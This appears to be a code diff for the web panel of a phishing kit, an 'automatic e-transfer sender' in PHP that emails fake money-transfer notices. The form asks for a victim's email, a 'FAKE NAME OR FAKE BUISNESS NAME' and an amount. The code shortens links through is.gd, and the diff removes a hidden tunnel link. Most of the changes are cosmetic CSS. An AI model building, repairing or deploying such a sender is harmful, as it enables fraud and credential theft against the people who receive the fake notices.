@@ -72,225 +72,59 @@ function shortenURL($url)
     $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
     return file_get_contents($api_url);
 }
+
+$currentDate = new DateTime();
+$expireDate = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');
+
+
 ?>
-<html><head>
-  <title>PHP Mailer System</title>
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    select {
-      appearance: none;
-      -webkit-appearance: none;
-      -moz-appearance: none;
-      background-color: #f2f2f2;
-      color: #555555;
-      border: 1px solid #cccccc;
-      padding: 8px 16px;
-      font-size: 14px;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-
-    select option {
-      font-size: 14px;
-    }
-
-    /* Custom styles for the dropdown arrow */
-    select::-ms-expand {
-      display: none;
-    }
-
-    select:after {
-      content: '\25BE';
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      font-size: 16px;
-      color: #555555;
-    }
-    
     body {
+      background-color: #000;
+      color: #fff;
       font-family: Arial, sans-serif;
-      font-size: 16px;
-      color: #333333;
-      background-color: #f2f2f2;
     }
-    
-  
 
-:root {
-  --glow-color: hsl(100 100% 69%);
-}
-
-*,
-*::before,
-*::after {
-  box-sizing: border-box;
-}
-
-html,
-body {
-  height: 100%;
-  width: 100%;
-  overflow: hidden;
-}
-
-body {
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  background: black;
-}
-
-.glowing-btn {
-  position: relative;
-  color: var(--glow-color);
-  cursor: pointer;
-  padding: 0.35em 1em;
-  border: 0.15em solid var(--glow-color);
-  border-radius: 0.45em;
-  background: none;
-  perspective: 2em;
-  font-family: "Raleway", sans-serif;
-  font-size: 2em;
-  font-weight: 900;
-  letter-spacing: 1em;
-
-  -webkit-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
-    0px 0px 0.5em 0px var(--glow-color);
-  -moz-box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
-    0px 0px 0.5em 0px var(--glow-color);
-  box-shadow: inset 0px 0px 0.5em 0px var(--glow-color),
-    0px 0px 0.5em 0px var(--glow-color);
-  animation: border-flicker 2s linear infinite;
-}
-
-:root {
-  /* Base font size */
-  font-size: 4px;   
-  
-  /* Set neon color */
-  --neon-text-color: #f40;
-  --neon-border-color: #08f;
-}
-
-body {
-  font-family: 'Exo 2', sans-serif;
-  display: flex;
-  justify-content: center;
-  align-items: center;  
-  background: #000;
-  min-height: 100vh;
-}
-
-h1 {
-  font-size: 13rem;
-  font-weight: 200;
-  font-style: italic;
-  color: #fff;
-  padding: 4rem 6rem 5.5rem;
-  border: 0.4rem solid #fff;
-  border-radius: 2rem;
-  text-transform: uppercase;
-  animation: flicker 1.5s infinite alternate;     
-}
-
-h1::-moz-selection {
-  background-color: var(--neon-border-color);
-  color: var(--neon-text-color);
-}
-
-h1::selection {
-  background-color: var(--neon-border-color);
-  color: var(--neon-text-color);
-}
-
-h1:focus {
-  outline: none;
-}
-
-/* Animate neon flicker */
-@keyframes flicker {
-    
-    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
-      
-        text-shadow:
-            -0.2rem -0.2rem 1rem #fff,
-            0.2rem 0.2rem 1rem #fff,
-            0 0 2rem var(--neon-text-color),
-            0 0 4rem var(--neon-text-color),
-            0 0 6rem var(--neon-text-color),
-            0 0 8rem var(--neon-text-color),
-            0 0 10rem var(--neon-text-color);
-        
-        box-shadow:
-            0 0 .5rem #fff,
-            inset 0 0 .5rem #fff,
-            0 0 2rem var(--neon-border-color),
-            inset 0 0 2rem var(--neon-border-color),
-            0 0 4rem var(--neon-border-color),
-            inset 0 0 4rem var(--neon-border-color);        
+    h1 {
+      text-align: center;
     }
-    
-    20%, 24%, 55% {        
-        text-shadow: none;
-        box-shadow: none;
-    }    
-}
-    /* Form element styling */
-    input[type="text"], textarea {
+
+    form {
+      margin: 20px;
+    }
+
+    input[type="text"], select {
       width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      box-sizing: border-box;
-      margin-top: 6px;
-      margin-bottom: 16px;
-      resize: vertical;
-      font-size: 16px;
-    }
-    
-    /* Submit button styling */
-    input[type="submit"] {
-      background-color: #007bff;
-      color: white;
-      padding: 12px 20px;
+      padding: 10px;
+      margin-bottom: 10px;
       border: none;
-      border-radius: 4px;
+      background-color: #333;
+      color: #fff;
+    }
+
+    input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      background-color: #0066cc;
+      color: #fff;
       cursor: pointer;
-      font-size: 16px;
-      transition: background-color 0.3s ease;
-    }
-    
-    /* Submit button hover state */
-    input[type="submit"]:hover {
-      background-color: #0062cc;
-    }
-    
-    /* Error message styling */
-    .error {
-      color: #dc3545;
-      font-size: 14px;
     }
   </style>
-  
-</head><body>
-
-    <?php
-    $currentDate = date('F d, Y');
-    $futureDate = date('F d, Y', strtotime('+30 days'));
-    ?>
-
-<form action="submit1.php" method="POST" enctype="multipart/form-data">
- <fieldset>
-<h1 style="text-align: center;">AUTOMATIC ETRANSFER SENDER</h1><input type="hidden" name="link" value="nh-changelog-testimony-shipped.trycloudflare.com" required="">
+</head>
+<body>
+  <form action="submit1.php" method="POST" enctype="multipart/form-data">
+    <h1>AUTOMATIC SENDER</h1>
 <input type="hidden" name="shortlink" value="" required="">
 <input type="text" name="receiver_email" placeholder="receivers email" value="" required="">
 <input type="text" name="receiver_name" placeholder="receivers name" value="One Time Contact" required="">
 <input type="text" name="sender_name" placeholder="FAKE NAME OR FAKE BUISNESS NAME" value="AB201293 LTD" required="">
 <input type="text" name="amount" placeholder="100.00" value="200.00" step="0.01" required="">
-<input type="hidden" name="expiredate" value="<?php echo $futureDate; ?>" required="">
+<input type="hidden" name="expiredate" value="<?php echo $expireDate; ?>" required="">
 
 
 
